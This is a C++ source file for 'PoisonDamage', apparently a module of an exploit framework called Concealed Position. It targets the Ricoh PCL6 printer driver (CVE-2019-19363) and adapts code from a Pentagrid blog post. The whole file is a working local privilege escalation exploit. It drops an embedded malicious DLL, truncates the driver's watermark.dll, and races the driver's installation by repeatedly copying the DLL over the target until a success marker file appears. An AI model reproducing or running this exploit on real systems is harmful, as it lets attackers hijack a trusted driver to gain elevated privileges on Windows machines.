#include <stdio.h>
#include <stdlib.h>
#include <conio.h>
#include <windows.h>
#include <iostream>
#include <fstream>
#include <thread>
#include <filesystem>

#include "poisondamage.hpp"
#include "inject_me.hpp"

/*
 * This code is largely based on the code shared by Pentagrid in their most excellent
 * blog for CVE-2019-19363:
 * 
 * https://www.pentagrid.ch/en/blog/local-privilege-escalation-in-ricoh-printer-drivers-for-windows-cve-2019-19363/
 * 
 * All credit to them. I have only modified it to be more C++-ey (to me), to operate within the confines of
 * Concealed Position and optimized the exploit... I think :P
*/

namespace
{
    void stompOnTarget(const std::string& p_target)
    {
        if (HANDLE hFile = CreateFileA(p_target.c_str(), GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
            NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL))
        {
            std::cout << "[+] File " << p_target << " has been truncated" << std::endl;
            CloseHandle(hFile);
        }
        else
        {
            // standard behavior on first install though
            std::cerr << "[!] File " << p_target << " could not be truncated. Likely first install." << std::endl;
        }
    }

    void HandleDirectoryChange(HANDLE dwCompletionPort, const std::string& p_target,
        const std::string& p_target_dll, const std::string& p_malicious_dll)
    {
        int change_counter = 100;
        LPDIRECTORY_INFO di = NULL;
        std::wstring wtarget_dll(p_target_dll.begin(), p_target_dll.end());

        do
        {
            DWORD numBytes = 0;
            LPOVERLAPPED lpOverlapped = NULL;
            if (!GetQueuedCompletionStatus(dwCompletionPort, &numBytes, (PULONG_PTR)&di, &lpOverlapped, 2000))
            {
                std::cout << "[-] Directory watch timed out." << std::endl;
                return;
            }

            if (di)
            {
                PFILE_NOTIFY_INFORMATION fni = (PFILE_NOTIFY_INFORMATION)di->lpBuffer;

                DWORD cbOffset = 0;
                do
                {
                    cbOffset = fni->NextEntryOffset;
                    if (fni->Action == FILE_ACTION_MODIFIED)
                    {
                        std::wstring filename(fni->FileName, fni->FileNameLength);
                        if (!wcsncmp(filename.c_str(), wtarget_dll.c_str(), filename.size()))
                        {
                            change_counter--;
                            if (change_counter > 0)
                            {
                                // just try to copy. don't check error status. it doesn't matter.
                                CopyFileA(p_malicious_dll.c_str(), p_target.c_str(), FALSE);
                            }
                            else
                            {
                                // welp. I guess it's not gonna happen?
                                return;
                            }
                        }
                    } // eo action mod
                    fni = (PFILE_NOTIFY_INFORMATION)((LPBYTE)fni + cbOffset);
                }
                while (cbOffset);

                // Reissue the watch command
                ReadDirectoryChangesW(di->hDir, di->lpBuffer, MAX_BUFFER, TRUE, s_notifyFilter, &di->dwBufLength, &di->Overlapped, NULL);
            }
        } while (di);
    }
}

PoisonDamage::PoisonDamage() :
    Exploit("PCL6 Driver for Universal Print", "PoisonDamage"),
    m_target_directory("C:\\ProgramData\\RICOH_DRV\\PCL6 Driver for Universal Print\\_common\\dlz\\"),
    m_target_dll("watermark.dll"),
    m_malicious_dll("Dll.dll")
{
}

PoisonDamage::~PoisonDamage()
{
}

bool PoisonDamage::do_exploit()
{
    if (!drop_dll_to_disk(m_malicious_dll, inject_me_dll, inject_me_dll_len))
    {
        return false;
    }

    if (!initialize_attack_space(m_target_directory))
    {
        return false;
    }

    // create the full path to the file we want to overwrite
    std::string target_path(m_target_directory);
    target_path.append(m_target_dll);

    bool loop = true;
    while (loop)
    {
        // truncate the target file
        stompOnTarget(target_path);

        // configure monitoring of the target directory
        DIRECTORY_INFO dirInfo = {};
        HANDLE hCompPort = configure_directory_monitoring(dirInfo, m_target_directory);
        if (hCompPort == 0)
        {
            return false;
        }

        // start the watcher thread and trigger installation
        std::thread watch(HandleDirectoryChange, hCompPort, std::ref(target_path), std::ref(m_target_dll), std::ref(m_malicious_dll));
        if (!install_printer())
        {
            return false;
        }
        watch.join();

        // monitor cleanup
        PostQueuedCompletionStatus(hCompPort, 0, 0, NULL);
        CloseHandle(dirInfo.hDir);
        CloseHandle(hCompPort);

        // did we succeed?
        if (!std::filesystem::exists("C:\\result.txt"))
        {
            std::cout << "[-] Failed! Try the exploit again!" << std::endl;
            std::cout << "[+] Sleep for 10 seconds" << std::endl;
            std::this_thread::sleep_for(std::chrono::milliseconds(10000));
        }
        else
        {
            std::cout << "[!] Mucho success!" << std::endl;
            loop = false;
        }
    }

    std::cout << "[+] Cleaning up dropped dll" << std::endl;
    _unlink(m_malicious_dll.c_str());
    return true;
}
